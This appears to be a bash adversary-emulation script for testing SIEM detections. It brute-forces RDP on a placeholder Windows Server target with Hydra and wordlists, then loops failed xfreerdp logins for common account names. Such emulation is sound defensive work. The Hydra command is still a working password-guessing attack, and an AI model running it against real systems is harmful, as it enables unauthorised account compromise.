#!/bin/bash
# Adversary Emulation Script - Kali Linux Attacker Host
# Target: Windows Server 2022

TARGET_IP="<TARGET_WINDOWS_IP>"
USER_WORDLIST="users.txt"
PASS_WORDLIST="passwords.txt"

echo "[*] Starting Adversary Emulation Workflow against $TARGET_IP..."

# 1. RDP Brute Force Simulation (Hydra)
# MITRE ATT&CK: T1110.001 - Password Guessing
echo "[+] Simulating RDP Brute Force Attack via Hydra..."
hydra -L $USER_WORDLIST -P $PASS_WORDLIST rdp://$TARGET_IP -t 4 -V -o hydra_rdp_results.txt

# 2. Automated RDP Auth Simulation (xfreerdp)
echo "[+] Triggering Failed Authentication telemetry via xfreerdp..."
for user in admin administrator user1 root; do
    xfreerdp /v:$TARGET_IP /u:$user /p:WrongPassword123! +auth-only /cert:ignore
done

echo "[*] Adversary simulation completed. Check Splunk SIEM for alert triggers."
